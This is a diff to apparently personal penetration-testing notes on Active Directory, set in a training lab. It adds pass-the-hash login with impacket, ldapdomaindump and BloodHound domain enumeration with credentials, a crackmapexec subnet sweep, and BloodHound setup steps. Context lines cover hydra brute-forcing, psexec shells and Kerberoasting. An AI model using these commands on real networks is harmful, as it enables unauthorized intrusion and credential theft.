@@ -93,6 +93,7 @@ hydra -L users.txt -P passwords.txt smb://<target>
 #try to get shell if $ADMIN having write permission for the user
 impacket-psexec username@<ip address>
 impacket-wmiexec username@<ip address>
+impacket-smbclient -hashes:<NTLM hash> Administrator@<ip address>
 
 ```
 
@@ -132,10 +133,10 @@ nltest /dclist:corp.local
 dsquery user -limit 0
 dsquery computer -limit 0
 
-#using advance automated tools:
+#using advance automated tools && Get all information about domain using single user credentails:
 bloodhound-python -c all -u user -p 'Password123!' -d corp.local -ip <target>
-ldapdomaindump -u UAP.local\\peter -p "password" <domain-ip> #get all information about 
-
+ldapdomaindump -u UAP.local\\peter -p "password" <domain-ip> 
+sudo ldapdomaindump ldaps://192.168.178.136 -u "MARVEL\username" -p Password1 -o Directory_path
 
 #using ldap_shell
 # Basic authentication with password
@@ -230,6 +231,11 @@ Invoke-Command -ComputerName <target> -Credential <domain\user> -ScriptBlock { w
 
 ```
 
+Identify domain controller script:
+```bash
+crackmapexec smb 192.168.1.0/24
+```
+
 
 Using Powerview script:
 ```bash
@@ -286,4 +292,53 @@ Get-NetUser -Username <username>
 Get-ASREPRoast
 Invoke-Kerberoast -OutputFormat Hashcat 
 
+```
+
+
+Enumeration using ldapdomaindump :
+```bash
+#get all information about domain using  users credentials:
+
+sudo ldapdomaindump ldap://192.168.178.136
+sudo ldapdomaindump ldaps://192.168.178.136 -u "MARVEL\username" -p Password1 -o Directory_path
+
+```
+
+Enumeration using bloodhound:
+```bash
+sudo neo4j console
+Then open your browser and go to: http://localhost:7474
+Username: neo4j
+Password: neo4j (you’ll be prompted to change this)
+
+Run Initial Setu
+sudo bloodhound-setup
+This initializes services and config files.
+
+Update BloodHound Config
+Edit the config file to match your new Neo4j password:
+
+
+sudo vim /etc/bhapi/bhapi.json
+
+ "neo4j": {
+    "addr": "localhost:7687",
+    "username": "neo4j",
+    "secret": "admin" #change this to your credentials
+  },
+
+
+Launch BloodHound
+Start BloodHound
+
+sudo bloodhound
+Log in with:
+
+Username: admin
+Password: admin (you’ll be prompted to change this)
+
+
+#Get all information about the particular user in domain then upload to bloodhound graph.
+
+sudo bloodhound-python -d MARVEL.local -u fcastle -p Password@123 -ns 192.168.154.134 -c all
 ```
